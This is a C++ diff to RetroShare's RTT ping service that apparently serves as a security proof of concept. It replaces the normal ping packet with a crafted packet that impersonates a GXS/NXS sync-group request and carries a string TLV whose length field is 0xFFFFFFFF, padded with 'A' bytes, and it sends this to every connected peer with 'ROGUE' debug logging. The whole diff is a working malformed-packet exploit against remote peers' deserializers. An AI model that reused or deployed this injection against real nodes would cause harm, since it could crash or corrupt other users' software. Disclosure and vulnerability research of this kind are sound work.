@@ -196,18 +196,99 @@ void p3rtt::sendPingMeasurements()
 	{
     		double ts = getCurrentTS();
             
-		/* create the packet */
-		RsRttPingItem *pingPkt = new RsRttPingItem();
-		pingPkt->PeerId(*it);
-		pingPkt->mSeqNo = mCounter;
-		pingPkt->mPingTS = convertTsTo64bits(ts);
+// [SECURITY PoC] Malicious GXS Packet Masquerading as RTT
+        class RsRttMaliciousPingItem : public RsRttPingItem {
+        public:
+            virtual void serial_process(RsGenericSerializer::SerializeJob j, RsGenericSerializer::SerializeContext& ctx) override {
+                const uint32_t PAYLOAD_SIZE = 300; 
 
+                if (j == RsGenericSerializer::SIZE_ESTIMATE) {
+                     ctx.mOffset += PAYLOAD_SIZE; 
+                }
+                else if (j == RsGenericSerializer::SERIALIZE) {
+                    if (ctx.mData) {
+                        // 1. Rewrite Header to GXS ID Service (0x0211) but utilize NXS Subtype
+                        // [0]=Ver(2), [1]=Grp(2), [2]=ServiceHi(2), [3]=Sub(1)
+                        ctx.mData[0] = 0x02; 
+                        ctx.mData[1] = 0x02; 
+                        ctx.mData[2] = 0x11; 
+                        ctx.mData[3] = 0x01; // Subtype 0x01 (RsNxsSyncGrpReqItem)
+                        
+                        // 2. Write Malicious Payload (RsNxsSyncGrpReqItem structure)
+                        // Offset 8: Start of Body.
+                        
+                        // A. transactionNumber (4 bytes)
+                        ctx.mData[8] = 0; ctx.mData[9] = 0; ctx.mData[10] = 0; ctx.mData[11] = 0;
+                        
+                        // B. flag (1 byte)
+                        ctx.mData[12] = 0;
+                        
+                        // C. createdSince (4 bytes)
+                        ctx.mData[13] = 0; ctx.mData[14] = 0; ctx.mData[15] = 0; ctx.mData[16] = 0;
+                        
+                        // D. syncHash (String TLV)
+                        // Offset 17: TLV Header.
+                        
+                        // Type: 0x0070 (TLV_TYPE_STR_HASH_SHA1). Big Endian: 00 70.
+                        ctx.mData[17] = 0x00;
+                        ctx.mData[18] = 0x70;
+                        
+                        // Length: 0xFFFFFFFF. Big Endian: FF FF FF FF.
+                        ctx.mData[19] = 0xFF;
+                        ctx.mData[20] = 0xFF;
+                        ctx.mData[21] = 0xFF;
+                        ctx.mData[22] = 0xFF;
+             
+                        // Fill rest with padding
+                        for(uint32_t i=23; i<ctx.mSize; ++i) ctx.mData[i] = 'A';
+                        
+                        // CRITICAL: Update ctx.mOffset
+                        ctx.mOffset = ctx.mSize;
+                        
+                        RsDbg() << "ROGUE: Injected Malicious NXS Packet (Subtype 0x01)! Wrote 0x0070 at 17, Size FFFFFFFF at 19.";
+                        
+                        // Verify content
+                        RsDbg() << "ROGUE: Verifying Buffer Content: " 
+                                << std::hex 
+                                << (int)ctx.mData[17] << " " 
+                                << (int)ctx.mData[18] << " " 
+                                << (int)ctx.mData[19] << " " 
+                                << (int)ctx.mData[20] << " " 
+                                << (int)ctx.mData[21] << " " 
+                                << (int)ctx.mData[22] << std::dec;
+                    }
+                }
+            }
+        };
+
+		/* create the packet */
+        RsDbg() << "ROGUE: p3rtt attempting to send malicious packet to " << *it;
+		// RsRttPingItem *pingPkt = new RsRttPingItem(); // ORIGINAL
+		RsRttPingItem *pingPkt = new RsRttMaliciousPingItem(); // MALICIOUS REPLACEMENT
+		pingPkt->PeerId(*it); 
+		
+		if (sendItem(pingPkt)) {
+		    RsDbg() << "ROGUE: sendItem() returned SUCCESS.";
+		} else {
+		    RsDbg() << "ROGUE: sendItem() returned FAILURE.";
+		}
+
+        // IMPORTANT: sendItem takes ownership, do NOT delete pingPkt here (or check semantics).
+        // Standard code:
+        /*
+		pingPkt->PeerId(*it);
 		storePingAttempt(*it, ts, mCounter);
+        mServiceCtrl->sendItem(pingPkt);
+        */
+        
+        // We already called sendItem. Just continue loop.
+		storePingAttempt(*it, ts, mCounter);
+		continue; // Skip original send logic
 
 #ifdef DEBUG_RTT
 		std::cerr << "p3rtt::sendPingMeasurements() Pinging: " << *it << " [" << pingPkt->mSeqNo << "," << std::hex << pingPkt->mPingTS << std::dec << "]" << std::endl;;
 #endif
-		sendItem(pingPkt);
+		// sendItem(pingPkt); // ORIGINAL CALL - We skip this.
 	}
 
 	RsStackMutex stack(mRttMtx); /****** LOCKED MUTEX *******/
